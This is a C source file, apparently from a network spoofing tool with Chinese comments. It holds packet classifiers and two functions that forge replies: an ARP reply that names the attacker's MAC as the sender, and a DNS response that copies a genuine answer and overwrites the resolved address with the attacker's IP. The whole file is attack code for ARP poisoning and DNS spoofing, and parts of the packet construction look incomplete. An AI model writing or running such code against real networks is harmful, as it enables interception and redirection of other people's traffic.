#include "FalsifyPackets.h"
#include "ProtocolHeaders.h"

char IsIPPacket(char *SrcStr, uint32_t Len) {
	EtherHeader Head = EtherParser(SrcStr, Len);
	if (!Head.ErrMsg)
		if (Head.EtherType == 0x0800)
			return 1;
	return 0;
}

char IsARPPacket(char *SrcStr, uint32_t Len) {
	EtherHeader Head = EtherParser(SrcStr, Len);
	if (!Head.ErrMsg)
		if (Head.EtherType == 0x0806)
			return 1;
	return 0;
}

char IsDNSPacket(char *SrcStr, uint32_t Len) {
	EtherHeader Head = EtherParser(SrcStr, Len);
	if (!Head.ErrMsg)
		if (Head.EtherType == 0x0800) {
			IPv4Header IP = IPv4Parser(SrcStr, Len - 14);
			if (!IP.ErrMsg)
				if (IP.Protocol == 17) {
					UDPHeader UDP = UDPParser(SrcStr, Len - 14 - IP.HeadLen);
					if (!UDP.ErrMsg)
						if (UDP.DestPort == 53) {
							if (Len - 14 - IP.HeadLen - UDP.UDPHeadLen > 12) {
								uint16_t ID = ToUint16(&SrcStr[14 + IP.HeadLen + UDP.UDPHeadLen]);
								uint16_t QuesCount = ToUint16(&SrcStr[14 + IP.HeadLen + UDP.UDPHeadLen + 4]);
								if (ID && QuesCount)return 1;
							}
						}
				}
		}
	return 0;
}

char *FalsifyResponseARP(char *SrcStr, char *DestStr, char *MyMac, char *MyIP) {
	// 1. 目标MAC地址：设置为客户端的MAC（原始请求的发送者）
	for (int i = 0; i < 6; i++) 
		DestStr[i] = SrcStr[6 + i];  // 原请求的发送者MAC（SrcStr[6:12]）
	// 2. 源MAC地址：设置为攻击者的MAC
	for (int i = 6; i < 12; i++) 
		DestStr[i] = MyMac[i - 6]; 
	// 3. 以太网类型：ARP（0x0806）
	DestStr[12] = 0x08;
	DestStr[13] = 0x06;
	// 4. ARP头部字段
	// 操作码：响应（2）
	DestStr[20] = 0x00;  // 高位字节
	DestStr[21] = 0x02;  // 低位字节
	// 发送者MAC（攻击者MAC）
	for (int i = 22; i < 28; i++) 
		DestStr[i] = MyMac[i - 22]; 
	// 发送者IP（攻击者IP）
	for (int i = 28; i < 32; i++) 
		DestStr[i] = MyIP[i - 28]; 
	// 目标MAC：原请求的发送者MAC（客户端MAC）
	for (int i = 32; i < 38; i++) 
		DestStr[i] = SrcStr[6 + i - 32]; 
	// 目标IP：原请求的发送者IP（客户端IP）
	for (int i = 38; i < 42; i++) 
		DestStr[i] = SrcStr[28 + i - 38]; 
	return DestStr;
}

char *FalsifyResponseDNS(const char *StrFromClient, const char *StrFromServer,
                         uint32_t LenOfServerRes, char *DestStr, const char *MyIP) {
	if (LenOfServerRes < 4) {
		fprintf(stderr, "服务器响应长度过小\n");
		return NULL;
	}
	memcpy(DestStr, StrFromClient, 4);
	DestStr[2] |= 0x80; // 设置响应标志
	memcpy(DestStr + 4, StrFromServer + 4, LenOfServerRes - 4); //复制数据部分
	memcpy(DestStr + LenOfServerRes - 4, MyIP, 4);  // 使用 memcpy 确保不越界
	return DestStr;
}
